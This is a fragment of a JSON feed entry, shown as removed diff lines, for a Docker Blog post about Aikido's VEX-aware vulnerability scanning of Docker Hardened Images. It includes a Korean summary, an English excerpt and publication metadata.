-    "aiSummary": "Aikido가 Docker Hardened Images에 대한 취약점 스캔 기능을 강화하며 VEX 지원을 새롭게 추가했습니다.\n\nDocker가 악용 가능성이 없다고 검증한 취약점들은 스캔 대기열에서 자동으로 제외됩니다. 이를 통해 개발자들은 불필요한 알림에 에너지를 쏟는 대신 실질적인 위협 요소 해결에 집중할 수 있게 되었습니다.\n\n이번 통합은 보안 점검 과정의 효율성을 크게 높여주며 개발 팀의 생산성을 개선하는 데 기여합니다. 사용자들은 Docker Hardened Images를 활용하여 보다 안전한 소프트웨어 공급망을 구축하고 취약점 관리 과정을 간소화할 수 있습니다.",
-    "cleanContent": "Aikido now scans Docker Hardened Images (DHI) with built-in VEX support. Vulnerabilities that Docker has verified as non-exploitable drop out of the queue automatically, so developers spend their time on findings that actually matter. This post walks through what changed, why it matters, and how users can benefit from the new integration. Why teams are...",
-    "url": "https://www.docker.com/blog/docker-hardened-images-enhanced-vulnerability-scanning-with-docker-and-aikido/",
-    "category": "클라우드 & 인프라",
-    "source": "Docker Blog",
-    "author": "Dan Berezin Stelzer",
-    "pubDate": "Thu, 11 Jun 2026 12:00:00 +0000",
-    "fetchedAt": "2026-06-13T19:19:32.218Z",
-    "tags": [
-      "Docker",
-      "Infra"
     ]
   }
 ]
